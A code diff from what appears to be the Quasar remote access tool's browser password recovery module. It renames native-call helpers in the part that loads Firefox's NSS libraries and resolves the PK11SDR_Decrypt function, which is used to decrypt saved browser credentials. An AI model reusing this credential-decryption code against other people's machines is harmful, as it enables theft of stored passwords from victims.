@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Utilities;
+﻿using Quasar.Common;
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -32,11 +32,11 @@ namespace Quasar.Client.Recovery.Browsers
         public long Init(string configDirectory)
         {
             string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
-            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
-            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
-            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
-            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
+            Mozglue = Win32.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
+            NSS3 = Win32.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
+            IntPtr initProc = Win32.GetProcAddress(NSS3, "NSS_Init");
+            IntPtr shutdownProc = Win32.GetProcAddress(NSS3, "NSS_Shutdown");
+            IntPtr decryptProc = Win32.GetProcAddress(NSS3, "PK11SDR_Decrypt");
             NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
             PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
             NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
@@ -108,8 +108,8 @@ namespace Quasar.Client.Recovery.Browsers
             if (disposing)
             {
                 NSS_Shutdown();
-                NativeMethods.FreeLibrary(NSS3);
-                NativeMethods.FreeLibrary(Mozglue);
+                Win32.FreeLibrary(NSS3);
+                Win32.FreeLibrary(Mozglue);
             }
         }
     }
